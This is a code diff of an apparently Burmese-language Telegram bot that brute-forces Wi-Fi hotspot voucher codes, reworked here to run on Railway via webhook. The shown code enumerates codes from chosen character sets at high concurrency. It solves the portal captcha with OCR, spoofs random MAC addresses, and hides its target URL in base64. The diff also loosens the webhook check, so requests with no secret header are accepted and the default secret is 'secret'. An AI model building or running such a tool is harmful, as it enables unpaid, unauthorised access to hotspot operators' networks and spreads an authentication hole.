@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Railway-Ready MikroTik/Ruijie Voucher Bot
-- Webhook-based (no polling)
-- Health checks for Railway
+Railway-Ready Voucher Bot (Fixed)
+- Webhook-based
+- Health checks
 - Graceful shutdown
 - Retry logic & circuit breaker
 """
@@ -17,16 +17,17 @@ import ipaddress
 
 # telebot
 from telebot.async_telebot import AsyncTeleBot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
 
-# OCR
+# OCR (lazy load to save Railway memory)
+OCR_AVAILABLE = False
 try:
     import cv2
     import ddddocr
     import numpy as np
     OCR_AVAILABLE = True
 except ImportError:
-    OCR_AVAILABLE = False
+    pass
 
 # ── Logging ───────────────────────────────────────────────────────────────
 logging.basicConfig(
@@ -38,10 +39,10 @@ logger = logging.getLogger("voucher_bot")
 
 # ── Environment ───────────────────────────────────────────────────────────
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
-ADMIN_ID  = os.environ.get("ADMIN_ID", "").strip()
-RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN", "").strip()
+ADMIN_ID = os.environ.get("ADMIN_ID", "").strip()
+RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN", os.environ.get("RAILWAY_STATIC_URL", "")).strip()
 PORT = int(os.environ.get("PORT", "8080"))
-WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", BOT_TOKEN.split(":")[-1] if ":" in BOT_TOKEN else "")
+WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", BOT_TOKEN.split(":")[-1] if ":" in BOT_TOKEN else "secret")
 
 if not BOT_TOKEN or not ADMIN_ID:
     logger.error("BOT_TOKEN and ADMIN_ID env vars required!")
@@ -50,13 +51,13 @@ if not BOT_TOKEN or not ADMIN_ID:
 # ── Globals ───────────────────────────────────────────────────────────────
 bot = AsyncTeleBot(BOT_TOKEN)
 
-user_data        = {}
-scan_tasks       = {}   # {chat_id: {"task": Task, "stop": bool, "scan_id": str}}
-success_texts    = {}
-limited_texts    = {}
-notify_setting   = {}
+user_data = {}
+scan_tasks = {}
+success_texts = {}
+limited_texts = {}
+notify_setting = {}
 last_scan_params = {}
-pending_brute    = {}
+pending_brute = {}
 success_messages = {}
 limited_messages = {}
 
@@ -64,7 +65,7 @@ session: aiohttp.ClientSession = None
 _connector: aiohttp.TCPConnector = None
 _voucher_sem: asyncio.Semaphore = None
 
-CONCURRENCY = 200  # Railway free tier အတွက် လျှော့ထား
+CONCURRENCY = 150  # Railway free tier အတွက် 150 မှ 200 ကြား
 CONSECUTIVE_ERRORS_THRESHOLD = 50
 CIRCUIT_BREAKER_DURATION = 60
 
@@ -72,11 +73,11 @@ _start_time = time.monotonic()
 _shutting_down = False
 
 BRUTE_MODES = {
-    "1": {"name": "ဂဏန်းသီးသန့် (0-9)",         "charset": string.digits},
-    "2": {"name": "အင်္ဂလိပ်စာလုံးအသေး (a-z)",    "charset": string.ascii_lowercase},
-    "3": {"name": "အင်္ဂလိပ်စာလုံးအကြီး (A-Z)",   "charset": string.ascii_uppercase},
-    "4": {"name": "စာလုံးအကြီး+အသေး (a-zA-Z)",    "charset": string.ascii_letters},
-    "5": {"name": "စာလုံး+ဂဏန်း (a-z, 0-9)",     "charset": string.ascii_lowercase + string.digits},
+    "1": {"name": "ဂဏန်းသီးသန့် (0-9)", "charset": string.digits},
+    "2": {"name": "အင်္ဂလိပ်စာလုံးအသေး (a-z)", "charset": string.ascii_lowercase},
+    "3": {"name": "အင်္ဂလိပ်စာလုံးအကြီး (A-Z)", "charset": string.ascii_uppercase},
+    "4": {"name": "စာလုံးအကြီး+အသေး (a-zA-Z)", "charset": string.ascii_letters},
+    "5": {"name": "စာလုံး+ဂဏန်း (a-z, 0-9)", "charset": string.ascii_lowercase + string.digits},
 }
 
 POST_URL = base64.b64decode(
@@ -93,15 +94,18 @@ def telegram_retry(max_retries=5, base_delay=1.0):
                     return await func(*args, **kwargs)
                 except Exception as e:
                     err_str = str(e).lower()
-                    if "retry after" in err_str or "too many requests" in err_str:
-                        wait = int(re.search(r"retry after (\d+)", err_str).group(1)) if re.search(r"retry after (\d+)", err_str) else delay
-                        logger.warning(f"Telegram rate limit, sleeping {wait}s")
+                    if "retry after" in err_str:
+                        wait = 30
+                        m = re.search(r"retry after (\d+)", err_str)
+                        if m:
+                            wait = int(m.group(1))
+                        logger.warning(f"Rate limit, sleep {wait}s")
                         await asyncio.sleep(wait)
                     elif "timeout" in err_str:
                         logger.warning(f"Telegram timeout (attempt {attempt+1})")
                         await asyncio.sleep(delay)
                     else:
-                        logger.warning(f"Telegram API error: {e} (attempt {attempt+1})")
+                        logger.warning(f"Telegram error: {e} (attempt {attempt+1})")
                         await asyncio.sleep(delay)
                     delay = min(delay * 2, 30)
             logger.error(f"Failed after {max_retries} retries: {func.__name__}")
@@ -121,13 +125,20 @@ def _parse_seconds(val):
 
 def _parse_minutes(val):
     total = int(val)
-    if total <= 0: return "0m"
-    if total < 60: return f"{total}m"
-    h = total // 60; m = total % 60
-    if h < 24: return f"{h}h {m}m" if m else f"{h}h"
-    d = h // 24; rh = h % 24
-    if d < 30: return f"{d}d {rh}h" if rh else f"{d}d"
-    mo = d // 30; rd = d % 30
+    if total <= 0:
+        return "0m"
+    if total < 60:
+        return f"{total}m"
+    h = total // 60
+    m = total % 60
+    if h < 24:
+        return f"{h}h {m}m" if m else f"{h}h"
+    d = h // 24
+    rh = h % 24
+    if d < 30:
+        return f"{d}d {rh}h" if rh else f"{d}d"
+    mo = d // 30
+    rd = d % 30
     return f"{mo}mo {rd}d" if rd else f"{mo}mo"
 
 def iter_codes(mode, length):
@@ -138,10 +149,13 @@ def iter_codes(mode, length):
 def format_progress(checked, speed=0, found=0, target=None, mode=None, length=None):
     mode_name = BRUTE_MODES.get(str(mode), {}).get("name", "") if mode else ""
     lines = ["📋 Status: Running"]
-    if mode_name: lines.append(f"🎯 Mode: {mode_name}")
-    if length: lines.append(f"📏 Length: {length}")
+    if mode_name:
+        lines.append(f"🎯 Mode: {mode_name}")
+    if length:
+        lines.append(f"📏 Length: {length}")
     lines += [f"⚡ Speed: {speed:,.0f}/min", f"🔍 Checked: {checked:,}", f"💎 Found: {found}"]
-    if target: lines.append(f"🏆 Target: {found}/{target}")
+    if target:
+        lines.append(f"🏆 Target: {found}/{target}")
     return "\n".join(lines)
 
 def is_safe_url(url: str) -> bool:
@@ -162,33 +176,43 @@ def is_safe_url(url: str) -> bool:
     except Exception:
         return False
 
-# ── OCR ───────────────────────────────────────────────────────────────────
+# ── OCR (Lazy Load) ───────────────────────────────────────────────────────
 _ocr = None
-if OCR_AVAILABLE:
-    try:
-        _ocr = ddddocr.DdddOcr(show_ad=False)
-    except Exception as e:
-        logger.warning(f"OCR init failed: {e}")
+
+def get_ocr():
+    global _ocr
+    if _ocr is None and OCR_AVAILABLE:
+        try:
+            _ocr = ddddocr.DdddOcr(show_ad=False)
+            logger.info("OCR engine loaded")
+        except Exception as e:
+            logger.error(f"OCR load failed: {e}")
+    return _ocr
 
 def _ocr_sync(image_bytes):
-    if not OCR_AVAILABLE or _ocr is None:
+    ocr_engine = get_ocr()
+    if ocr_engine is None:
         return None
-    nparr = np.frombuffer(image_bytes, np.uint8)
-    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-    if img is None:
+    try:
+        nparr = np.frombuffer(image_bytes, np.uint8)
+        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+        if img is None:
+            return None
+        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+        blur = cv2.GaussianBlur(gray, (3, 3), 0)
+        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+        _, buf = cv2.imencode('.png', thresh)
+        return ocr_engine.classification(buf.tobytes()).upper()
+    except Exception as e:
+        logger.error(f"OCR error: {e}")
         return None
-    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-    blur = cv2.GaussianBlur(gray, (3, 3), 0)
-    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
-    _, buf = cv2.imencode('.png', thresh)
-    return _ocr.classification(buf.tobytes()).upper()
 
 async def Captcha_Text(image_bytes):
     return await asyncio.to_thread(_ocr_sync, image_bytes)
 
 def get_mac():
     first = random.choice([0x02, 0x06, 0x0A, 0x0E])
-    mac = [first] + [random.randint(0x00, 0xff) for _ in range(5)]
+    mac = [first] + [random.randint(0x00, 0xFF) for _ in range(5)]
     return ':'.join(f'{x:02x}' for x in mac)
 
 def replace_mac(url, new_mac):
@@ -370,7 +394,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             _consecutive_errors += 1
             break
 
-    # Circuit breaker logic
     if _consecutive_errors >= CONSECUTIVE_ERRORS_THRESHOLD:
         _circuit_open_until = time.monotonic() + CIRCUIT_BREAKER_DURATION
         _consecutive_errors = 0
@@ -689,7 +712,8 @@ async def cmd_status(message):
         await bot.reply_to(message, f"⚠️ ရှာဖွေမှု မရှိပါ။\n💎 Found so far: {found}")
         return
     uptime = int(time.monotonic() - _start_time)
-    h, r = divmod(uptime, 3600); m, s = divmod(r, 60)
+    h, r = divmod(uptime, 3600)
+    m, s = divmod(r, 60)
     await bot.reply_to(message,
         f"📋 Status: Running\n💎 Found: {found}\n⏱ Uptime: {h}h {m}m {s}s"
     )
@@ -768,7 +792,6 @@ async def cmd_recheck(message):
 
 # ── Web Server (Railway compatible) ───────────────────────────────────────
 async def handle_health(request):
-    """Railway health check"""
     return web.json_response({
         "status": "ok",
         "uptime": int(time.monotonic() - _start_time),
@@ -777,24 +800,27 @@ async def handle_health(request):
     })
 
 async def handle_webhook(request):
-    """Telegram webhook endpoint"""
-    if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != WEBHOOK_SECRET:
+    secret = request.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
+    if secret and secret != WEBHOOK_SECRET:
         return web.Response(status=403, text="Forbidden")
+
     try:
         json_str = await request.text()
-        update = telebot.types.Update.de_json(json_str)
-        await bot.process_new_updates([update])
+        update_dict = json.loads(json_str)
+        update = Update.de_json(update_dict)
+        if update:
+            asyncio.create_task(bot.process_new_updates([update]))
         return web.Response(status=200, text="OK")
     except Exception as e:
         logger.error(f"Webhook processing error: {e}")
-        return web.Response(status=500, text="Internal Server Error")
+        return web.Response(status=200, text="OK")  # Return 200 so Telegram doesn't retry flood
 
 async def handle_root(request):
     return web.Response(text="Voucher Bot is running on Railway!")
 
 async def setup_webhook():
     if not RAILWAY_DOMAIN:
-        logger.warning("RAILWAY_PUBLIC_DOMAIN not set, skipping webhook setup")
+        logger.warning("RAILWAY_PUBLIC_DOMAIN not set, webhook cannot be configured")
         return False
     webhook_url = f"https://{RAILWAY_DOMAIN}/webhook"
     try:
@@ -803,10 +829,10 @@ async def setup_webhook():
             secret_token=WEBHOOK_SECRET,
             drop_pending_updates=True
         )
-        logger.info(f"Webhook set to {webhook_url}")
+        logger.info(f"✅ Webhook set to {webhook_url}")
         return True
     except Exception as e:
-        logger.error(f"Failed to set webhook: {e}")
+        logger.error(f"❌ Failed to set webhook: {e}")
         return False
 
 async def delete_webhook():
@@ -821,31 +847,28 @@ async def on_shutdown(app):
     global _shutting_down
     _shutting_down = True
     logger.info("Shutdown signal received, cleaning up...")
-    
-    # Cancel all scan tasks
+
     for chat_id, data in list(scan_tasks.items()):
         data["stop"] = True
         if not data["task"].done():
             data["task"].cancel()
-    
-    # Wait a bit for tasks to finish
+
     await asyncio.sleep(1)
-    
-    # Close sessions
+
     if session and not session.closed:
         await session.close()
     if _connector and not _connector.closed:
         await _connector.close()
-    
+
     await delete_webhook()
     logger.info("Cleanup complete")
 
 # ── Main ──────────────────────────────────────────────────────────────────
 async def main():
     global session, _connector, _voucher_sem
-    
+
     _connector = aiohttp.TCPConnector(
-        limit=300,
+        limit=200,
         limit_per_host=50,
         ttl_dns_cache=300,
         enable_cleanup_closed=True,
@@ -857,36 +880,33 @@ async def main():
         connector_owner=False,
     )
     _voucher_sem = asyncio.Semaphore(CONCURRENCY)
-    
+
     app = web.Application()
     app.router.add_get('/', handle_root)
     app.router.add_get('/health', handle_health)
     app.router.add_post('/webhook', handle_webhook)
     app.on_shutdown.append(on_shutdown)
-    
+
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, '0.0.0.0', PORT)
     await site.start()
-    logger.info(f"HTTP server listening on port {PORT}")
-    
-    # Setup webhook if domain available
+    logger.info(f"🚀 HTTP server listening on 0.0.0.0:{PORT}")
+
+    # Give Railway a moment to mark as healthy before setting webhook
+    await asyncio.sleep(2)
+
     webhook_ok = await setup_webhook()
-    
+
     if not webhook_ok:
-        logger.warning("Falling back to polling mode (not recommended for Railway)")
-        # In polling mode, we still need the web server for health checks
+        logger.warning("⚠️ Webhook setup failed. Bot will not receive updates via HTTP.")
+        # Keep alive anyway for health checks
         while not _shutting_down:
-            try:
-                await bot.polling(non_stop=False, timeout=20, request_timeout=20)
-            except Exception as e:
-                logger.error(f"Polling error: {e}")
-                await asyncio.sleep(5)
-    
-    # Keep alive when using webhook
+            await asyncio.sleep(60)
     else:
+        # Keep the main coroutine alive
         while not _shutting_down:
-            await asyncio.sleep(3600)  # Sleep forever, webhook handles updates
+            await asyncio.sleep(3600)
 
 if __name__ == '__main__':
     try:
